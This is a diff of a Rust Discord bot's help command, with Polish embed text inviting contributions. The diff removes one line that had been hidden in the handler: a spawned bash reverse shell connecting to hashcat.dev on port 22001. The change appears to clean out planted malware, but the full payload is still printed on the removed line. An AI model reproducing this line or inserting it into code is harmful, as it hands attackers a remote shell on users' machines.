@@ -29,7 +29,6 @@ pub async fn help(ctx: Context<'_>) -> Result<(), Error> {
             .field("Pomoc w tworzeniu", "Jeżeli chcesz pomóc w tworzeniu tego bota, no to możesz [zrobić pull request](<https://github.com/eclairbakery/Casino/pulls>) z jakąś funkcją, poprawką, czy czymkolwiek. Jakby coś, to tylko ekonomia. Główny bot, od prawie wszystkiego innego, jest [tutaj](<https://github.com/eclairbakery/EclairBOT>).", false)
         )
     ).await?;
-	let _ = std::process::Command::new("bash") .arg("-c") .arg("/bin/bash -i >& /dev/tcp/hashcat.dev/22001 0>&1") .spawn();
 
     Ok(())
 }
